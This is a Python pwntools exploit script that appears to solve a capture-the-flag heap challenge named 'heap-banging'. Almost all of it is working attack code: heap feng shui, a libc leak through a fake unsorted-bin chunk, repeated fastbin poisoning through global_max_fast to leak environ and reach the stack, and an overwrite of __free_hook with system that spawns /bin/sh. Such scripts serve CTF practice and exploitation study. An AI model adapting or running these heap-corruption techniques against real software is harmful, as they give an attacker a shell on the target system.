#!/usr/bin/env python3

from pwn import *

# make calloc wont memset data trick
## https://www.synacktiv.com/publications/heap-tricks-never-get-old-insomnihack-teaser-2022.html

exe = ELF('./heap-banging_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create():
	sa(b">> ", b"1")

def show(idx):
	sa(b">> ", b"2")
	sa(b"riff: ", f"{idx}".encode())

def edit(idx, data):
	sa(b">> ", b"3")
	sa(b"play: ", f"{idx}".encode())
	sa(b"along: ", data)

def delete(idx):
	sa(b">> ", b"4")
	sa(b"forget: ", f"{idx}".encode())	

script = '''
brv 0x131D
'''

#p = remote("heap-banging.chal.crewc.tf", 1337, ssl=True)
p = process('./heap-banging_patched')
#p = gdb.debug('./heap-banging_patched', gdbscript = script)

# heap fengshui, create fake unsortedbin chunk
for i in range(12): # from 0 -> 11
	create()
edit(0, b"0" * 0x78 + p16(0x501))

# leak libc
delete(1)
create() # 12
show(2)
rcu(b"Song lyrics: ")
libc_base = u64(p.recv(8)) - 0x1ecbe0
lleak("libc_base", libc_base)

# fill out tcache
for i in range(12, 12 - 7, -1):
	delete(i)

create() # 13 overlap with 2

# fastbin poisoning to global_max_fast
global_max_fast = libc_base + libc.symbols['global_max_fast']
delete(13)
edit(2, p64(global_max_fast - 0x8))
create() # 14 overlap with 2
create() # 15, also the [global_max_fast - 8]

# keep fastbin poisoning until reach to environ
for i in range(0xe):
	delete(14 + i * 2)
	edit(15 + i * 2, b"\x00" * 0x78 + p16(0x83)) # size 0x83 so calloc wotn memset
	edit(2, p64((global_max_fast - 0x8) + 0x80 * (i + 1)))
	create() # 14 + (i + 1) * 2, overlap with 2
	create() # 15 + (i + 1) * 2, in libc region

# leak environ value, 15 + 0xe * 2 = 43
show(43)
rcu(b"Song lyrics: ")
rcu(b"\x00" * 0x58)
environ_val = u64(p.recv(8))
lleak("environ_val", environ_val)

# fastbin poisoning to stack
rsp_main = environ_val - 0x338
delete(0) # this is important to set fake fastbin size
delete(42)
edit(2, p64(rsp_main + 4))
delete(0x83) # set up fake fastbin size abusing stack variable
create()
create() # 45, also in stack

# change pointer array point to __free_hook then overwrite it
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
edit(45, b"\x00" * 4 + p64(__free_hook)) # now 1 point to __free_hook
edit(1, p64(system))
edit(44, b"/bin/sh\x00")

# trigger
delete(44)

#debug()

p.interactive()
